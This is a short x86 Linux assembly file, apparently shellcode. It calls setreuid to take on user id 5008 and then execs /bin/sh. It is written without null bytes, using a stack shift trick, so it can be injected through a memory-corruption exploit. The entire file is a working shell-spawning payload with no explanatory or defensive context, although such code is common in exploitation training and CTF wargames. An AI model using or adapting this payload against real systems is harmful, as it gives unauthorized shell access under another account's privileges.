section .text
	global _start

_start:
	; setreuid(5008, 5008)
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	mov al, 0x46
	mov bx, 5008
	mov cx, 5008
	int 0x80

	; exec("/bin/sh", NULL, NULL)
	xor eax, eax
	mov ebp, esp
	push dword 0x6a68732f
	push dword 0x6e69622f
	shr byte [esp+0x7], byte 0x8
	xor ecx, ecx
	xor edx, edx
	mov ebx, esp
	mov al, 0xb
	int 0x80
